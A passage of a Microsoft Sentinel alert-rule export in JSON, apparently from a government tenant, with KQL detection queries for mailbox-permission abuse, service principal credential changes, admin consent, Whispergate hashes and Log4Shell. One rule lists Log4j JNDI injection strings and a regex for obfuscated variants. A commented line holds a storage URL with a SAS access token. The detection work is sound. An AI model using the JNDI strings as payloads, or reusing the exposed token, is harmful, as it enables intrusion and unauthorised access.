Parameters\r\n    | extend client_pair = strcat(InitiatedBy, \",\", InitiatedByIP)\r\n    | where client_pair !in~ (exclusions)\r\n    // This is the App ID for the Identity-Graph-API-Connector - believed to be used for migrations\r\n    | where InitiatedBy !contains \"234797b6-5624-4e53-8f94-45c02d08e86d\"\r\n    | extend Params1 = parse_json(ParamsModified).[1].Name\r\n    | where Params1 !in~ (ParamsExcluded)\r\n    | project-away client_pair, ActionAccountSrcIP\r\n    | extend InitiatedByIP = tostring(InitiatedByIP)\r\n    // Use regex to replace the brackets found within some of the events\r\n    | extend InitiatedByIP = replace_regex(InitiatedByIP, @\"[\\[\\]]\", \"\")\r\n    | where not(\r\n            Params1 == \"GrantSendOnBehalfTo\" and InitiatedBy contains TargetedMbx and\r\n        (ipv4_is_match(\"140.16.0.0/16\", InitiatedByIP) or ipv4_is_match(\"140.17.0.0/16\", InitiatedByIP) or ipv4_is_match(\"140.24.0.0/16\", InitiatedByIP))\r\n        )\r\n    | sort by TimeGenerated asc, InitiatedBy\r\n    | extend Initiatedby_info = pack(\"TimeGenerated\", TimeGenerated, \"IPAddress\", InitiatedByIP, \"Params\", ParamsModified)\r\n    | summarize InititatedBy_Info =make_list(Initiatedby_info), Count =count() by InitiatedBy, TargetedMbx;\r\nlet userstolookup = main\r\n    | summarize make_set(InitiatedBy);\r\nmain\r\n| join kind=leftouter (userlookup\r\n    | where user in (userstolookup))\r\n    on $left.InitiatedBy == $right.['user']\r\n| extend Authorized = iff((AssignedRoles has (\"Administrator\") and InitiatedBy endswith \"dod365.onmicrosoft.us\"), \"True\", \"False\")\r\n| extend IPAddress = InititatedBy_Info.[0].IPAddress\r\n| extend ActionTaken = InititatedBy_Info.[0].Params\r\n| where AssignedRoles !contains \"Exchange Administrator\" and InitiatedBy !contains \"adm\"\r\n| project\r\n    InitiatedBy,\r\n    TargetedMbx,\r\n    IPAddress,\r\n    ActionTaken,\r\n    Count,\r\n    InitiatingUserRoles = AssignedRoles","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatedBy"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"TargetedMbx"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","Collection"],"techniques":[],"displayName":"Rare and potentially high-risk Office operations v2","enabled":true,"description":"Identifies Office operations that are typically rare and can provide capabilities useful to attackers. Examples include; changing/modifying mailbox permissions.\nPLATFORM:Microsoft 365\nMITRE:TA0003;T1098;T1098.002","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-10T20:36:34.5664525Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/0fb34a58-90d8-41ee-a17d-77f52f00b3e5","name":"0fb34a58-90d8-41ee-a17d-77f52f00b3e5","etag":"\"1e00bbe7-0000-2700-0000-62c704ca0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let IPList = externaldata(IPAddress:string)[@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Log4j_IOC_List.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\r\nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\r\n(union isfuzzy=true\r\n  (OfficeActivity\r\n  | extend SourceIPAddress = ClientIP, Account = UserId\r\n  | where  SourceIPAddress in (IPList)\r\n  | extend timestamp = TimeGenerated , IPCustomEntity = SourceIPAddress , AccountCustomEntity = Account\r\n  ),\r\n  (SigninLogs\r\n  | where isnotempty(IPAddress)\r\n  | where IPAddress in (IPList)\r\n  | extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress\r\n  ),\r\n  (AzureActivity\r\n  | where isnotempty(CallerIpAddress)\r\n  | where CallerIpAddress in (IPList)\r\n  | extend timestamp = TimeGenerated, IPCustomEntity = CallerIpAddress, AccountCustomEntity = Caller\r\n  ),\r\n  (\r\n  DeviceNetworkEvents\r\n  | where isnotempty(RemoteIP)\r\n  | where RemoteIP in (IPList)\r\n  | extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName\r\n  )\r\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl"],"techniques":[],"displayName":"Log4j vulnerability exploit aka Log4Shell IP IOC","enabled":false,"description":"Identifies a match across various data feeds for IP IOCs related to the Log4j vulnerability exploit aka Log4Shell described in CVE-2021-44228.    References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228","alertRuleTemplateName":null,"lastModifiedUtc":"2022-07-07T16:07:38.0736762Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e693e3e9-4f20-4c2f-a697-5e041c35565b","name":"e693e3e9-4f20-4c2f-a697-5e041c35565b","etag":"\"0301266f-0000-2700-0000-63ff6f150000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":1,"severity":"Medium","query":"//Author: Matt Schwartz\r\n//Description: The following alert reports activity for users accessing mailboxes that are not their own.\r\n//False Positives: None known\r\nlet identity_lookup = 30d;\r\nlet main_lookup = 24h;\r\nlet user_threshold = 0;\r\nlet folder_threshold = 0\t\t;\r\nlet OpsTable = datatable(Category:string, Operation:string) [\r\n    'Domain_Operations',\"Set domain authentication\",\r\n    'Domain_Operations',\"Set federation settings on domain\",\r\n    'AppUpdate_Operations',\"Update application\",\r\n    'AppUpdate_Operations',\"Update application ? Certificates and secrets management\",\r\n    'ServicePrincipal_Operations',\"Update service principal\",\r\n    'ServicePrincipal_Operations',\"Add service principal credentials\",\r\n    'AppRoleAssignment_Operations',\"Add app role assignment\",\r\n    'Consent_Operations',\"Add OAuth2PermissionGrant\",\r\n    'Consent_Operations',\"Consent to application\",\r\n    'SAMLToken_Operations',\"UserLoggedIn\",\r\n    'SAMLToken_Operations',\"UserLoginFailed\",\r\n    'PSMailbox_Operations',\"MailboxLogin\",\r\n    'PSLogin_Operations',\"UserLoggedIn\",\r\n    'PSLogin_Operations',\"UserLoginFailed\",\r\n    'MailItemsAccessed_Operations',\"MailItemsAccessed\",\r\n    'FileItems_Operations',\"FileAccessed\",\r\n    'FileItems_Operations',\"FileAccessedExtended\"\r\n    ];\r\n// let approved_delegates = \r\n// externaldata(MailboxOwnerUPN:string,UserId:string)[@\"https://solorigatedemo.file.core.windows.net/deleteme-demo/approved_mailbox_delegations.csv?sp=rl&st=2021-02-05T19:07:51Z&se=2022-02-02T19:07:00Z&sv=2019-12-12&sig=LgjDWJO9s9n%2BuMYFei%2Fe2GIEvKm5zyBlFxIst2MUJe0%3D&sr=f\"]\r\n    // with(format=\"csv\",ignoreFirstRecord=true);\r\nlet main =OfficeActivity\r\n| where TimeGenerated >=ago(main_lookup)\r\n| join kind=inner OpsTable on Operation\r\n| project CreationTime = TimeGenerated, Id = AADGroupId, Category, Operation, Organization = OrganizationId, RecordType, ResultStatus, LogonError = LoginStatus, UserKey, UserType, Version = ClientVersion, Workload = OfficeWorkload, ClientIP, ObjectId = OfficeObjectId, UserId, AzureActiveDirectoryEventType = Type, ExtendedProperties, ModifiedProperties, Actor, ActorContextId, ActorIpAddress, InterSystemsId, IntraSystemId, SupportTicketId, Target = AADTarget, TargetContextId, AppId = AzureADAppId, \"ClientAppId\", ClientIPAddress = Client_IPAddress, ClientInfoString, ExternalAccess, InternalLogonType, LogonType = Logon_Type, MailboxGuid, MailboxOwnerSid, MailboxOwnerUPN, \"OperationProperties\", OrganizationName, OriginatingServer, Folders, \"OperationCount\", LogonUserSid, \"ApplicationId\", \"CorrelationId\", EventSource, ItemType, \"ListId\", \"ListItemUniqueId\", Site = Site_, UserAgent, \"WebId\", \"HighPriorityMediaProcessing\", SourceFileExtension, SiteUrl = Site_Url, SourceFileName, SourceRelativeUrl\r\n| where Category == \"MailItemsAccessed_Operations\"\r\n| where ResultStatus =~ \"Succeeded\"\r\n| where tolower(MailboxOwnerUPN) != tolower(UserId) //negate to detect anomolous activity\r\n| where isnotempty(Folders)\r\n// | join kind=leftanti approved_delegates on MailboxOwnerUPN, UserId\r\n| mv-expand parse_json(Folders)\r\n| extend folders = tostring(Folders.Path)\r\n| extend ClientIP = coalesce(ClientIP, iif(ClientIPAddress startswith \"[\", extract(\"\\\\[([^\\\\]]*)\", 1, ClientIPAddress), ClientIPAddress))\r\n| where folders != \"\\\\Calendar\"\r\n| summarize make_set(folders), make_set(ClientInfoString), make_set(ClientIP), make_set(MailboxGuid), MailboxOwnerUPN =make_set(MailboxOwnerUPN) by UserId\r\n| extend folder_count = array_length(set_folders)\r\n| extend user_count = array_length(set_MailboxGuid)\r\n| where user_count > user_threshold or folder_count > folder_threshold\r\n| extend Reason = case(user_count > user_threshold and folder_count > folder_threshold, \"Both User and Folder Theshold Exceeded\", folder_count > folder_threshold and user_count < user_threshold, \"Folder Count Threshold Exceeded\",\"User Threshold Exceeded\")\r\n| sort by user_count desc\r\n| mv-expand MailboxOwnerUPN, set_MailboxGuid, set_ClientIP\r\n| project-reorder UserId, user_count, folder_count, MailboxOwnerUPN, set_MailboxGuid, set_ClientIP, set_ClientInfoString, set_folders\r\n| where UserId !has \"S-1-5-18\"\r\n| where isnotempty(MailboxOwnerUPN)\r\n// | summarize count(Category) by bin(CreationTime, 1h), AppId, Category\r\n// | render timechart \r\n//| extend Users = tostring(Users)\r\n;\r\n// make set of suspicious users\r\nlet suspiciousUsers = main\r\n| summarize suspiciousUsers = make_set(UserId);\r\n// make set of mailbox owners\r\nlet mailboxOwner = main\r\n| summarize mailboxOwner = make_set(MailboxOwnerUPN);\r\n// pull suspicous users identities into query\r\nlet useraccessing =\r\nIdentityInfo\r\n| where TimeGenerated >=ago(identity_lookup)\r\n| where AccountUPN in (suspiciousUsers)\r\n| summarize max(TimeGenerated), UserId = tostring(make_set(AccountUPN)[0]), AccountDisplayName = tostring(make_set(AccountDisplayName)[0]), JobTitle = make_set(JobTitle)[0], Department = tostring(make_set(Department)[0]) by AccountUPN\r\n| join kind=rightouter (main\r\n| extend MailboxOwnerUPN = tostring(MailboxOwnerUPN))\r\non UserId\r\n| project-away UserId\r\n| project-rename SuspiciousUser = UserId1;\r\nIdentityInfo\r\n| where TimeGenerated >=ago(identity_lookup)\r\n| where AccountUPN in (mailboxOwner)\r\n| summarize max(TimeGenerated), UserId = tostring(make_set(AccountUPN)[0]), AccountDisplayName = tostring(make_set(AccountDisplayName)[0]), JobTitle = make_set(JobTitle)[0], Department = tostring(make_set(Department)[0]) by AccountUPN\r\n| join (useraccessing)\r\non $left.UserId == $right.MailboxOwnerUPN\r\n// Writes \"Not Listed\" if AAD does not have an entry for this field.\r\n| extend JobTitle = iif(isempty(JobTitle), \"Not Listed\", JobTitle)\r\n| extend JobTitle1 = iif(isempty(JobTitle1), \"Not Listed\", JobTitle1)\r\n| extend Department = iif(isempty(Department), \"Not Listed\", Department)\r\n| extend Department1 = iif(isempty(Department1), \"Not Listed\", Department1)\r\n// Create information packs for displayed users\r\n| extend MailboxOwner_Info = pack (\"Email\", AccountUPN, \"Department\", Department, \"JobTitle\", JobTitle)\r\n| extend SuspiciousUser_Info = pack(\"Email\", SuspiciousUser, \"IPAddress\", set_ClientIP, \"Department\", Department1, \"JobTitle\", JobTitle1)\r\n// Remove suspicious users that have the title ~ assistant\r\n| where not(parse_json(SuspiciousUser_Info)['JobTitle'] has \"Assistant\" or parse_json(SuspiciousUser_Info)['JobTitle'] has \"Asst\" or parse_json(SuspiciousUser_Info)['JobTitle'] has \"Chief\")\r\n| project MailboxOwnerDisplayName = AccountDisplayName, MailboxOwner_Info, SuspiciousUserDisplayName = AccountDisplayName1, SuspiciousUser_Info, folder_count, Reason, MailboxGUID = set_MailboxGuid, ClientInfoString = set_ClientInfoString, Folders = set_folders\r\n| sort by folder_count\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"MailboxOwnerDisplayName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"SuspiciousUserDisplayName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Collection","Exfiltration"],"techniques":[],"displayName":"BAH_Anomalous_User_Impersonation_Exchange","enabled":true,"description":"The following alert reports activity for users accessing mailboxes that are not their own.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-03-01T15:28:20.726274Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c035adf7-b53f-4db6-9b6a-5746855cd23a","name":"c035adf7-b53f-4db6-9b6a-5746855cd23a","etag":"\"8800cb0c-0000-2700-0000-66fdcd680000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Matt Schwartz, Steven Wan\n//Description: This analytic checks back 14d and uses that history to determine if any new application or service principal has had its credentials changed as instituted by a new user or by a new calling resource within the polling period as configured in this analytic.\n//False Positives: May alert on non-malicious activity that is legitimate. These alerts however will be very infrequent / little. If it does fire off too often this can be reworked.\n    let starttime = now(-14d);\n    let endtime = now();\n    let excludesync = '06c9ca02-8129-473d-8ae9-f964890b5706';\n    let Sparrow_BaseHunt_AuditLog1=(opstable:(Category_:string,Operation:string)){\n    AuditLogs | where TimeGenerated between(starttime .. endtime) and InitiatedBy !has excludesync | join kind=inner opstable on $left.OperationName == $right.Operation | mv-expand TargetResources, AdditionalDetails, InitiatedBy| extend ib_app = \"\", ib_user = \"\", tr_modifiedProperties = dynamic(null), tr_type = \"\", tr_displayName = \"\", tr_id = \"\"| extend tr = parse_json(TargetResources), ad = parse_json(AdditionalDetails), ib = parse_json(InitiatedBy)| evaluate bag_unpack(tr, 'tr_', columnsConflict='replace_source')| evaluate bag_unpack(ad, 'ad_', columnsConflict='replace_source')| evaluate bag_unpack(ib, 'ib_', columnsConflict='replace_source')| extend app_actor = iif(isnotempty(ib_app),true,false)| extend obj_actor = iif(app_actor, parse_json(ib_app), parse_json(ib_user))| extend actor_id = iif(app_actor,coalesce(obj_actor.appId,obj_actor.servicePrincipalId),obj_actor.userPrincipalName)| extend actor_name = iif(app_actor,obj_actor.displayName,obj_actor.userPrincipalName)| extend actor_type = iif(app_actor,\"App\",\"User\")| extend tr_modifiedProperties = iif(tr_modifiedProperties==\"[]\",dynamic(null),tr_modifiedProperties)| mv-expand tr_modifiedProperties| extend newValue = tostring(tr_modifiedProperties.newValue)| extend oldValue = tostring(tr_modifiedProperties.oldValue)| extend set1 = parse_json(newValue)| extend set2 = parse_json(oldValue)| extend diff = set_difference(set1, set2)| parse diff with * \"KeyIdentifier=\" keyIdentifier:string \",KeyType=\" keyType:string \",KeyUsage=\" keyUsage:string \",DisplayName=\" keyDisplayName:string \"]\" *| extend credential = case(keyType != \"\", keyType, \"Other/not logged\")\n    };\n    Sparrow_BaseHunt_AuditLog1(datatable(Category_:string,Operation:string)[\n        'Application_Operations','Update application',\n        'Application_Operations','Update application ??? Certificates and secrets management ',\n        'ServicePrincipal_Operations',\"Update service principal\",\n        'ServicePrincipal_Operations',\"Add service principal credentials\"\n        ])\n    | extend propertyName = tostring(tr_modifiedProperties.displayName)\n    | extend objServicePrincipal = iif(propertyName=='TargetId.ServicePrincipalNames',true,false)\n    | extend diff = iif(objServicePrincipal, set_difference(pack_array(set1), pack_array(set2)), diff)\n    | extend ServicePrincipalsAffected = iif(objServicePrincipal, diff,'')\n    | where (actor_name !=\"Managed Service Identity\" and actor_name !=\"\")\n    | where credential !=\"AsymmetricX509Cert\"\n    | where actor_type ==\"User\"\n    | project CreationTime = TimeGenerated, Id, CorrelationId, Category, OperationName, AADOperationType, ResultStatus = Result\n        , Version = OperationVersion, AADTenantId, ResourceId, Actor = actor_name, ActorType = actor_type\n        , ActorId = actor_id, ResourceName = tr_displayName, ResourcePrincipalId = tr_id, EventSource = SourceSystem\n        , CredentialType = credential, ServicePrincipalsAffected, ExtendedProperties = obj_actor, InitiatedBy, TargetResources\n        , ModifiedProperties = tr_modifiedProperties;","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatedBy"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","PrivilegeEscalation"],"techniques":["T1078","T1134"],"displayName":"BAH_AppServicePrincipal_CredentialCheck","enabled":true,"description":"This analytic checks back 14d and uses that history to determine if any new application or service principal has had its credentials changed as instituted by a new user or by a new calling resource within the polling period as configured in this analytic.\nPLATFORM:Windows\nMITRE:TA0001;T1078;T1078.002;T1078.003,TA0003;T1078;T1078.002;T1078.003,TA0004;T1134","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:47:03.652498Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8a1fd65d-ffdb-4f5a-a30a-3a598e0342ff","name":"8a1fd65d-ffdb-4f5a-a30a-3a598e0342ff","etag":"\"8500a6c6-0000-2700-0000-66fdab140000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let UserAgentString = dynamic ([\"${jndi:ldap:/\", \"${jndi:rmi:/\", \"${jndi:ldaps:/\", \"${jndi:dns:/\", \"${jndi:iiop:/\",\"${jndi:\",\"${jndi:nds:/\",\"${jndi:corba/\"]);\nlet UARegexMinimalString=dynamic(['{','%7b', '%7B']);\nlet UARegex = @'(\\\\$|%24)(\\\\{|%7B)([^jJ]*[jJ])([^nN]*[nN])([^dD]*[dD])([^iI]*[iI])(:|%3A|\\\\$|%24|}|%7D)';\n(union isfuzzy=true\n(OfficeActivity\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = ClientIP, Account = UserId, Type, Operation\n),\n(AzureDiagnostics\n| where Category in (\"FrontdoorWebApplicationFirewallLog\", \"FrontdoorAccessLog\", \"ApplicationGatewayFirewallLog\", \"ApplicationGatewayAccessLog\")\n| where userAgent_s has_any (UserAgentString) or userAgent_s matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent = userAgent_s, SourceIP = clientIP_s, Type, host_s, Url = requestUri_s, httpStatus_d, ruleName_s, transactionId_g, ResourceType, ResourceId\n),\n(\nW3CIISLog\n| where csUserAgent has_any (UserAgentString) or csUserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent = csUserAgent, SourceIP = cIP, Account = csUserName, Type, sSiteName, csMethod, Url = csUriStem\n),\n(\nAWSCloudTrail\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = SourceIpAddress, Account = UserIdentityUserName, Type, EventName\n),\n(SigninLogs\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = IPAddress, Account = UserPrincipalName, Type, Operation = OperationName, tostring(LocationDetails), tostring(DeviceDetail),    AppDisplayName, ClientAppUsed\n),\n(AADNonInteractiveUserSignInLogs \n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = IPAddress, Account = UserPrincipalName, Type, Operation = OperationName, tostring(LocationDetails), tostring(DeviceDetail), AppDisplayName, ClientAppUsed\n),\n(_Im_WebSession (httpuseragent_has_any=array_concat(UserAgentString,UARegexMinimalString))\n| where HttpUserAgent has_any (UserAgentString) or HttpUserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by HttpUserAgent, SourceIP = SrcIpAddr, DstIpAddr, Account = SrcUsername, Url, Type\n)\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"SourceIP"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"Account"}]}],"templateVersion":"1.0.4","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1190"],"displayName":"User agent search for log4j exploitation attempt","enabled":true,"description":"This query uses various log sources having user agent data to look for log4j CVE-2021-44228 exploitation attempt based on user agent pattern. Log4j is an open-source Apache logging library that is used in \n many Java-based applications. The regex and the string matching look for the most common attacks. This might not be comprehensive to detect every possible user agent variation.\n Reference: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/\nPLATFORM:IaaS,Windows\nMITRE:TA0001;T1190","alertRuleTemplateName":"29283b22-a1c0-4d16-b0a9-3460b655a46a","lastModifiedUtc":"2024-10-02T20:20:32.2130063Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/cd82260e-ecb5-4cc8-bd70-c9034964330b","name":"cd82260e-ecb5-4cc8-bd70-c9034964330b","etag":"\"0e00ab1e-0000-2700-0000-627172e10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let hashCheck = _GetWatchlist('Whispergate');\r\nlet watchTime = ago(7d);\r\nDeviceFileEvents\r\n| where TimeGenerated >= watchTime\r\n| where isnotempty(MD5) \r\n| join kind =inner hashCheck on $left.MD5 == $right.indicator\r\n\r\n\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":[],"displayName":"Whispergate file hash detected","enabled":false,"description":"(TEST) Files hashes known hashes associated to the Whispergate malware have been found in Device tables. ","alertRuleTemplateName":null,"lastModifiedUtc":"2022-05-03T18:22:25.3099319Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/dcbb61a2-b574-4a62-bb1f-108713656830","name":"dcbb61a2-b574-4a62-bb1f-108713656830","etag":"\"8700cde2-0000-2700-0000-66fdcaa20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Matt Schwartz\r\n//Description: This analytic looks for user consent granted to application registrations by an administrator.\r\n//False Positives: None known\r\n    let starttime = now(-14d);\r\n    let endtime = now();\r\n    let excludesync = '06c9ca02-8129-473d-8ae9-f964890b5706';\r\n    let Sparrow_BaseHunt_AuditLog=(opstable:(Category_:string,Operation:string)){\r\n    AuditLogs | where TimeGenerated between(starttime .. endtime) and InitiatedBy !has excludesync | join kind=inner opstable on $left.OperationName == $right.Operation | mv-expand TargetResources, AdditionalDetails, InitiatedBy| extend ib_app = \"\", ib_user = \"\", tr_modifiedProperties = dynamic(null), tr_type = \"\", tr_displayName = \"\", tr_id = \"\"| extend tr = parse_json(TargetResources), ad = parse_json(AdditionalDetails), ib = parse_json(InitiatedBy)| evaluate bag_unpack(tr, 'tr_', columnsConflict='replace_source')| evaluate bag_unpack(ad, 'ad_', columnsConflict='replace_source')| evaluate bag_unpack(ib, 'ib_', columnsConflict='replace_source')| extend app_actor = iif(isnotempty(ib_app),true,false)| extend obj_actor = iif(app_actor, parse_json(ib_app), parse_json(ib_user))| extend actor_id = iif(app_actor,coalesce(obj_actor.appId,obj_actor.servicePrincipalId),obj_actor.userPrincipalName)| extend actor_name = iif(app_actor,obj_actor.displayName,obj_actor.userPrincipalName)| extend actor_type = iif(app_actor,\"App\",\"User\")| extend tr_modifiedProperties = iif(tr_modifiedProperties==\"[]\",dynamic(null),tr_modifiedProperties)| mv-expand tr_modifiedProperties| extend newValue = tostring(tr_modifiedProperties.newValue)| extend oldValue = tostring(tr_modifiedProperties.oldValue)| extend set1 = parse_json(newValue)| extend set2 = parse_json(oldValue)| extend diff = set_difference(set1, set2)| parse diff with * \"KeyIdentifier=\" keyIdentifier:string \",KeyType=\" keyType:string \",KeyUsage=\" keyUsage:string \",DisplayName=\" keyDisplayName:string \"]\" *| extend credential = case(keyType != \"\", keyType, \"Other/not logged\")\r\n    };\r\n    Sparrow_BaseHunt_AuditLog(datatable(Category_:string,Operation:string)[\r\n        'Consent_Operations','Consent to application'\r\n        ,'Consent_Operations','Add OAuth2PermissionGrant'\r\n        ])\r\n    | extend propertyName = tostring(tr_modifiedProperties.displayName)\r\n    | extend bPermission = iif(propertyName==\"ConsentAction.Permissions\",true,false)\r\n    | extend bServicePrincipal = iif(propertyName==\"TargetId.ServicePrincipalNames\",true,false)\r\n    | extend bAdmin = iif(propertyName==\"ConsentContext.IsAdminConsent\",true,false)\r\n    | extend bAppOnly = iif(propertyName==\"ConsentContext.IsAppOnly\",true,false)\r\n    | extend bForAll = iif(propertyName==\"ConsentContext.OnBehalfOfAll\",true,false)\r\n    | extend diff = iff(tobool(binary_or(binary_or(binary_or(bServicePrincipal,bAdmin),bAppOnly),bForAll)), set_difference(pack_array(set1), pack_array(set2)), diff)\r\n    | parse newValue with \"\\\"\" oldConsent:string \" => \" newConsent:string \"\\\"\"\r\n    | extend kvpNew = todynamic(iff(bPermission,extract_all(@\"(\\w*):\\s*([^,\\];]*),?\",newConsent),''))\r\n    | mv-apply kvpNew on (\r\n        summarize newBag = make_bag(pack(tostring(kvpNew[0]),tostring(kvpNew[1])))\r\n        )\r\n    | evaluate bag_unpack(newBag, \"consent\")\r\n    | extend ServicePrincipalAssigned = iif(bServicePrincipal, diff, '')\r\n    | extend AdminConsent = iif(bAdmin, diff, '')\r\n    | extend AppOnlyConsent = iif(bAppOnly, diff, '')\r\n    | extend ForAllConsent = iif(bForAll, diff, '')\r\n    | extend consentScope = column_ifexists('consentScope', '')\r\n    | extend consentClientId = column_ifexists('consentClientId', '')\r\n    | extend consentPrincipalId = column_ifexists('consentPrincipalId', '')\r\n    | extend consentResourceId = column_ifexists('consentResourceId', '')\r\n    | extend consentConsentType = column_ifexists('consentConsentType', '')\r\n    | extend consentId = column_ifexists('consentId', '')\r\n    | extend ad_key = column_ifexists('ad_key', '')\r\n    | extend ad_value = column_ifexists('ad_value', '')\r\n    | extend consentScope = split(consentScope,\" \")\r\n    | mv-apply consentScope on (\r\n        summarize make_set_if(consentScope,isnotempty(consentScope))\r\n        )\r\n    | summarize 